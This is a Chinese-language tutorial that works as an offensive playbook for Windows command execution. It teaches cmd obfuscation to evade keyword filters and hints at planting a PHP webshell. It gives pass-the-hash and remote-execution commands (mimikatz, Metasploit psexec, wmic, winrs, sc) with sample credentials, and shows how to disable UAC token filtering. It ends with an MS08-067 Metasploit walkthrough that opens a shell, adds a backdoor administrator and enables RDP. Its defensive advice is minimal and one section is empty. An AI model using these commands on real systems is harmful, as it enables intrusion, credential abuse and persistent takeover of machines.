# 4.26-Practical-windows-命令执行下的N种姿势

# 漏洞描述

## 什么是Windows命令执行漏洞
命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()等函数，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。日常的网络访问中，我们常常可以看到某些Web网站具有执行系统命令的功能，比如：有些网站提供ping功能，我们可以输入一个IP地址，它就会帮我们去尝试ping目标的IP地址，而我们则可以看到执行结果。但是如果用户没有遵循网站的本意，而去输入精心构造的指令，可能会对网站本身的功能逻辑产生逆转，导致让目标网站执行恶意命令。恶意用户通过将恶意系统命令拼接到正常命令中，让网站执行恶意命令。

## 命令执行漏洞分类
### web代码层命令执行：代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在Web应用中通过system函数来调用，如果开发人员使用不正确的输入过滤机制，攻击者可能会绕过过滤，输入包含特殊字符的恶意代码：
```bash
system("/bin/program --arg $arg");
```
### 系统层面的漏洞造成命令注入
代码注入漏洞允许攻击者将恶意代码注入到应用程序中，并以应用程序的上下文来执行命令，包括 SQL 注入、OS 命令注入等：
bash破壳漏洞(CVE-2014-6271)、MS08-67、永恒之蓝

### 调用的第三方组件存在代码执行漏洞
WordPress中用来处理图片的ImageMagick组件
JAVA中的命令注入漏洞（struts2/ElasticsearchGroovy等）
vBulletin 5.x版本通杀远程代码执行
ThinkPHP命令执行

# 漏洞利用方法

## windows命令执行漏洞绕过过滤
### 1.符号与命令的关系:
`”` 和 `^` 还有成对的圆括号 `()` 符号并不会影响命令的执行。在windows环境下，命令可以不区分大小写,可以加无数个 `”` 但不能同时连续加2个 `^` 符号，因为 `^` 号是cmd中的转义符，跟在他后面的符号会被转义。如果在命令执行的时候遇到了拦截命令的关键字，那么就可以使用添加符号的方式绕过，这种方法使用更隐蔽的方式表达了相同的意思:
```bash
whoami #正常执行
w"h"o"a"m"i #正常执行
w"h"o"a"m"i" #正常执行
wh""o^a^mi #正常执行
wh""o^am"i #正常执行
((((Wh^o^am""i)))) #正常执行
w"""""""""""""hoami #正常执行
w"""""""""""""hoa^^m""i #执行错误
```

### 2.了解set命令和windows变量:
set命令可以用来设置一个变量,用两个%括起来的变量，会引用其变量内的值：
```bash
set a=1 #设置变量a，值为1
echo a #此时输出结果为"a"
echo %a% #此时输出结果为"1"
```
通过设置变量为命令，结合使用%，可以执行命令：
```bash
set a=whoami #设置变量a的值为whoami
%a% #引用变量a的值，直接执行了whoami命令
```
通过组合拼接，可以执行命令：
```bash
set a=who
set b=ami
%a%%b% #正常执行whoami

set a=w""ho
set b=a^mi
%a%%b% #根据前一知识点进行组合，正常执行whoami

set a=ser&& set b=ne&& set c=t u && call %b%%c%%a% #在变量中设置空格，最后调用变量来执行命令
```
通常我们也可以自定义一个或者多个环境变量，利用环境变量值中的字符，提取并拼接出最终想要的cmd命令。如:
```bash
Cmd /C "set envar=net user && call echo %envar%" #可以拼接出cmd命令：net user
```
也可以定义多个环境变量进行拼接命令串，提高静态分析的复杂度：

```bash
cmd /c "set envar1=ser&& set envar2=ne&& set envar3=t u&&call echo %envar2%%envar3%%envar1%"
```
cmd命令的 `“/C”` 参数，`Cmd /C “string”` 表示：执行字符串string指定的命令，然后终止。
而启用延迟的环境变量扩展，经常使用 cmd.exe的 `/V:ON` 参数，`/V:ON` 参数启用时，可以不使用call命令来扩展变量，使用 `%var% `或 `!var!` 来扩展变量，`!var!` 可以用来代替 `%var%` ，也就是可以使用感叹号字符来替代运行时的环境变量值。后面介绍For循环时会需要开启 `/V:` 参数延迟变量扩展方式。
### 3.windows进阶，切割字符串：
进阶一下，命令行也有类似php或者python之类的语言中的截取字符串的用法。还拿刚才的whoami来举例：
```bash
%a:~0% #取出a的值中的所有字符，此时正常执行whoami
%a:~0,6% #取出a的值，从第0个位置开始，取6个值,此时因为whoami总共就6个字符，所以取出后正常执行whoami
%a:~0,5% #取5个值，whoam无此命令
%a:~0,4% #取4个值，whoa无此命令
```

从执行结果可以看出，截取字符串的语法就是： `%变量名:~x,y%` ，即对变量从第x个元素开始提取，总共取y个字符。也可以写-x,-y，从后往前取写作 `-x` ，可取从后往前数第x位的字符开始，一直到字符的末尾， `-y` 来决定少取几个字符。  
输入 `set` 查看目前有哪些变量，可以看到电脑上的环境变量还是挺多的，几乎可以用这种方式执行任何命令，因为这些变量的值，几乎都有26个字母在了，从简单的开始，如果命令执行不允许空格，被过滤，那么可以：  
```bash
net%CommonProgramFiles:~10,1%user 
``` 

`CommonProgramFiles=C:\Program Files\Common Files` 从CommonProgramFiles这个变量中截取，从第10个字符开始，截取后面一个字符，那这个空格就被截取到了(也就是Program和Files中间的那个空格)，net user正常执行，还可以配合符号一起使用:
```bash
n^et%CommonProgramFiles:~10,1%us^er 
```

列出C盘根目录:  
```bash
d^i^r%CommonProgramFiles:~10,1%%commonprogramfiles:~0,3% #~10,1对应空格，~0,3对应"C:\" 
```
假如环境变量里没有我们需要的字符怎么办呢，那就自己设置:
```bash
set TJ=a bcde/$@\";fgphvlrequst? #比如上面这段组合成一个php一句话不难吧？
```
看到这里，聪明的你应该已经学会如何使用这种方式来给网站目录里写个webshell了吧。  

### 4.逻辑运算符在绕过中的作用：
相信所有人都知道， `|` 在cmd中，可以连接命令，且只会执行后面那条命令:
```bash
whoami | ping www.baidu.com

ping www.baidu.com | wh""oam^i

#两条命令都只会执行后面的
```

而 `||` 符号的情况下，只有前面的命令失败，才会执行后面的语句:
```bash
ping 127.0.0.1 || whoami #不执行whoami

ping xxx. || whoami #执行whoami 
```

而 `&` 符号，前面的命令可以成功也可以失败，都会执行后面的命令，其实也可以说是只要有一条命令能执行就可以了，但whoami放在前面基本都会被检测:
```bash
ping 127.0.0.1 & whoami //执行whoami

ping xxx. & whoami //执行whoami 
```

而 `&&` 符号就必须两条命令都为真才可以了:
```bash
ping www.baidu.com -n 1 && whoami //执行whoami

ping www && whoami //不执行whoami
```

### 5.利用For循环拼接命令:
For循环经常被用来混淆处理cmd命令，使得cmd命令看起来复杂且难以检测。最常用的For循环参数有 /L,/F参数。FOR 参数 %变量名 IN (相关文件或命令) DO 执行的命令。  

```bash
for /L %variable in (start,step,end) do command [command-parameters]
```

该命令表示以增量形式从开始到结束的一个数字序列。使用迭代变量设置起始值(start)。然后逐步执行一组范围的值，直到该值超过所设置的终止值 (end)。 `/L` 将通过对start与end进行比较来执行迭代变量。如果start小于end，就会执行该命令，否则命令解释程序退出此循环。还可以使用负的 step以递减数值的方式逐步执行此范围内的值。
例如，(1,1,5) 生成序列 1 2 3 4 5，
而 (5,-1,1) 则生成序列 (5 4 3 2 1)。

```bash
cmd /C "for /L %i in (1,1,5) do start cmd"
```
该命令会执行打开5个cmd窗口。

`/F` 参数： 是最强大的命令，用来处理文件和一些命令的输出结果。
```bash
FOR /F ["options"] %variable IN (file-set) DO command [command-parameters]

FOR /F ["options"] %variable IN ("string") DO command [command-parameters]

FOR /F ["options"] %variable IN ('command') DO command [command-parameters] 
```

(file-set) 为文件名，for会依次将file-set中的文件打开，并且在进行到下一个文件之前将每个文件读取到内存，按照每一行分成一个一个的元素，忽略空白行。(“string”)代表字符串，(‘command’)代表命令。
假如文件aa.txt中有如下内容：  
第1行第1列 第1行第2列  
第2行第1列 第2行第2列  

要想读出aa.txt中的内容，可以用 `for /F %i in (aa.txt) do echo %i` ，如果去掉/F参数则只会输出aa.txt，并不会读取其中的内容。 先从括号执行，因为含有参数/F,所以for会先打开aa.txt，然后读出aa.txt里面的所有内容，把它作为一个集合，并且以每一行作为一个元素。由执行结果可见，并没有输出第二列的内容。原因是如果没有指定"delims=符号列表"这个开关，那么 `for /F` 语句会默认以空格键或Tab键作为分隔符。 `For /F` 是以行为单位来处理文本文件的，如果我们想把每一行再分解成更小的内容，就使用delims和tokens选项。delims用来告诉for每一行用什么作为分隔符，默认分隔符是空格和Tab键。  
```bash
for /F "delims= " %i in (aa.txt) do echo %i
```

将delims设置为空格，是将每个元素以空格分割，默认只取分割之后的第一个元素。如果我们想得到第二列数据，就要用到tokens=2，来指定通过delims将每一行分成更小的元素时，要取出哪一个或哪几个元素:  
```bash
for /F "tokens=2 delims= " %i in (aa.txt) do echo %i 
```


## Windows远程执行cmd命令的9种方法
远程执行命令方式及对应端口:  

```
IPC$+AT 445
PSEXEC 445
WMI 135
Winrm 5985(HTTP)&5986(HTTPS)
```
### 1.WMI执行命令方式,无回显:
```bash
wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create "cmd.exe /c ipconfig>d:\result.txt"
```
### 2.使用Hash直接登录Windows（HASH传递）:
抓取windows hash值,得到administrator的hash：
598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF  
```bash
msf调用payload：
use exploit/windows/smb/psexec
show options
set RHOST 192.168.81.129
set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF
set SMBUser Administrator
show options
run
```
### 3.mimikatz传递hash方式连接+at计划任务执行命令：
Mimikatz 是一个用于提取系统中存储的明文密码、哈希值和票据的工具。它可以用于在 Windows 系统中执行横向移动，其中一个常见的用途就是通过在受感染系统上设置计划任务（at 计划任务）来执行命令。  
```bash
#使用 Mimikatz 的 psexec 模块将哈希值传递给目标系统，这将使用哈希值进行身份验证，并启动一个新的命令提示符（cmd.exe）进程
# mimikatz sekurlsa::pth /user:<目标用户> /domain:<目标域> /ntlm:<目标NTLM哈希> /run:"cmd.exe"
mimikatz.exe privilege::debug "sekurlsa::pth /user:administrator /domain:. /ntlm:2D20D252A479F485CDF5E171D93985BF" 
dir \\192.168.1.185\c$
```
### 4.WMIcmd执行命令,有回显：
```bash
WMIcmd.exe -h 192.168.1.152 -d hostname -u pt007 -p admin123 -c "ipconfig"
```
程序下载地址：
https://github.com/nccgroup/WMIcmd/releases
### 5.Cobalt strkie远程执行命令与hash传递攻击:
### 6.psexec.exe远程执行命令:
需要下载 Sysinternals 工具包，其中包含 PsExec。你可以从 [Microsoft 官方网站](https://learn.microsoft.com/zh-cn/sysinternals/downloads/)上下载 Sysinternals Suite。将下载的 PsExec.exe 文件放置在系统的 PATH 目录中，或者在命令行中直接指定 PsExec.exe 的完整路径。
```bash
psexec /accepteula //接受许可协议
sc delete psexesvc
# psexec \\目标计算机 -u 用户名 -p 密码 命令
# 目标计算机: 目标计算机的名称或 IP 地址。-u 用户名: 用于身份验证的用户名。
#-p 密码: 用户名对应的密码。命令: 要在远程系统上执行的命令。
psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
```
### 7.psexec.vbs远程执行命令:
```bash
cscript psexec.vbs 192.168.1.158 pt007 admin123 "ipconfig"
```
### 8.winrm远程执行命令:
Windows 远程管理服务（WinRM）是 Microsoft 提供的用于在 Windows 系统上进行远程管理的服务。WinRM 使用了标准的 Web 服务协议（HTTP 和 HTTPS）来提供远程管理。你可以使用 PowerShell 或其他工具通过 WinRM 在远程系统上执行命令。  
```bash
#肉机上面快速启动winrm服务，并绑定到5985端口：
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
netstat -ano|find "5985"
#客户端连接方式：
winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 "whoami /all"
winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 cmd
#UAC问题（用户账户控制）,修改后，普通管理员登录后也是高权限:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 "whoami /groups"
```
* 注意事项:  
1.`UAC` 是 `Windows` 中的一种安全机制，用于防止未经授权的更改系统设置。当 `UAC` 启用时，即使用户有管理员权限，也可能需要以管理员身份运行某些命令。请确保有适当的权限来在远程系统上执行命令。 
2.在远程系统上启用 WinRM 时，请注意系统安全性，确保仅受信任的用户或系统可以访问 WinRM。  
3.需要注意防火墙设置，确保 WinRM 的端口（默认为 5985 或 5986）是允许通信的。  

### 9.远程命令执行sc:
在 Windows 操作系统中，sc（Service Control）命令用于与系统服务进行交互。    
建立 `IPC` 连接(参见net use + at)后上传等待运行的bat或exe程序到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行程序）, `IPC`（Inter-Process Communication）是进程间通信的缩写，指的是在不同进程之间传递数据和信息的机制：
```bash
net use \\192.168.17.138\c$ "admin123" /user:pt007
net use
dir \\192.168.17.138\c$
copy test.exe \\192.168.17.138\c$
# 使用 sc 创建一个新服务
sc \\192.168.17.138 create test binpath= "c:\test.exe"
# 使用 sc 启动一个服务
sc \\192.168.17.138 start test
# 使用 sc 删除一个服务
sc \\192.168.17.138 del test
```

# 漏洞利用案例
## Windows漏洞利用之MS08-067远程代码执行漏洞复现
### 一、漏洞原理
MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure Call，远程过程调用）请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。

当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。它影响了某些旧版本的Windows系统，包括：
```
Windows 2000
Windows XP
Windows Server 2003
```

MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的NEtPathCanonicalize函数时触发的。NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。

如果想了解该漏洞的原理知识，推荐以下三篇文章。

https://www.cnblogs.com/justforfun12/p/5239941.html
https://bbs.pediy.com/thread-251219.htm
https://www.freebuf.com/vuls/203881.html
MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。
### 二、环境搭建
受害机：Windows XP SP1镜像
攻击机：Kali系统

第一步，在虚拟机中安装Windows XP SP1系统和Kali系统。

第二步，虚拟机两个系统之间能够相互通信。
Kali：192.168.44.136
Win XP：192.168.44.135

第三步，打开Windows XP系统，确定445端口开启。如下图所示，在Win XP的CMD中输入“netstat -sn”查看端口445是否打开。

第四步，关闭Windows XP系统的防火墙。

做完这些初始准备之后，我们开始利用Kali系统进行漏洞复现。
### 三、利用Metasploit复现漏洞
135、137、138、139和445这些端口，它们都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。

第一步，利用Nmap工具扫描端口及确认该漏洞是否存在。
```bash
nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open
```
nmap漏扫脚本目录为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示MS0808-067漏洞存在且可以利用。
或者使用 “nmap -sV -Pn 192.168.44.135” 查看目标主机开放的端口。目标机开放了135、139、445、1025、5000端口，且目标机系统为Windows XP。作为黑客，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。
```bash
nmap  -sV -Pn 192.168.44.135
```

第二步，进入Msfconsole并利用search语句查找漏洞利用模块。
终端内输入msfconsole打开metasploite命令行客户端，使用search命令查找ms08-067的漏洞利用模块。
```bash
msfconsole
search ms08-067
```

第三步，进入漏洞模块，并查看相关的使用说明。
使用use命令选择我们要使用的利用模块。target设置为系统默认是自动定位，如果需要精确定位，可以show targets查看所有，然后进行选择。
```bash
use exploit/windows/smb/ms08_067_netapi
show options
show targets
```

第四步，设置攻击机、受害机信息。
```bash
# 目标机ip
set RHOST 192.168.44.135
# 端口号
set RPORT 445
# 设置payload
set payload generic/shell_bind_tcp
# 攻击机ip
set LHOST 192.168.44.136
# 设置自动类型
set target 0
# 显示配置信息
show options
```

第五步，运行exploit反弹shell。
此时我们成功获取了Windows XP系统的Shell，我们调用“ipconfig”查看的IP地址也是目标的“192.168.44.135”。
```bash
exploit
session 1
ipconfig
pwd
```
注意：Windows XP SP1系统是中文而不是英文的，需要对ms08_067_netapi_ser2003_zh.rb处理。

参考：MS08-067 远程执行代码 漏洞复现 - feizianquan

第六步，在目标主机上创建文件夹及文件。
```bash
cd ..
# 创建文件夹
mkdir hacker
# 访问目录
dir
cd hacker
# 创建文件并写入内容
echo eastmount>test.txt
# 查看目标系统的基本信息
sysinfo
```
显示结果下图所示：

第七步，对目标XP主机进行深度提权。
```bash
# 增加普通用户
net user hacker 123456 /add 
# 提升管理员权限
net localgroup administrators hacker /add
```
Windows DOM用户常用命令如下：

net user abcd 1234 /add
新建一个用户名为abcd，密码为1234的帐户，默认为user组成员
net user abcd /del
将用户名为abcd的用户删除
net user abcd /active:no
将用户名为abcd的用户禁用
net user abcd /active:yes
激活用户名为abcd的用户
net user abcd
查看用户名为abcd的用户的情况
net localgroup administrators abcd /add
将abcd账户给予管理员权限

此时被攻击的主机新增“hacker”管理员如下图所示：

第八步，开启远程连接3389端口并进行远程操作。

首先查看端口，发现目标主机Windows XP并未开启3389端口。

输入命令开启远程连接端口。

接着输入“rdesktop 192.168.44.135”连接远程IP地址，并输入我们创建好的hacker用户名及密码。

输入创建的用户名hacker和密码123456回车，弹出提示框点击OK，稍等就会成功远程登录XP系统。

最后，我们还需要将新建的用户名hacker删除。写到这里，整个实验就讲解完毕。
## 漏洞防御
一方面关闭相关端口、安装杀毒软件和补丁，另一方面在防火墙中进行流量监测，主要是针对数据包中存在的形如"\ ** \ … \ … \ *"这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配。
本次实验完整命令：

```bash
# 端口查询
nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open

# 查找漏洞利用模块
msfconsole
search ms08-067

# 漏洞利用
use exploit/windows/smb/ms08_067_netapi
show options
show targets

# 设置相关配置信息
set RHOST 192.168.44.135
set RPORT 445
set payload generic/shell_bind_tcp
set LHOST 192.168.44.136
set target 0
show options

# 反弹shell
exploit
session 1
ipconfig
pwd

# 目标主机文件操作
cd ..
mkdir hacker
dir
cd hacker
echo eastmount>test.txt
sysinfo

# 深度提权及远程连接操作
net user hacker 123456 /add 
net localgroup administrators hacker /add
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f > C:\WINDOWS\system32\3389.bat && call 3389.bat
netstat -an
rdesktop 192.168.44.135
```


# 安全建议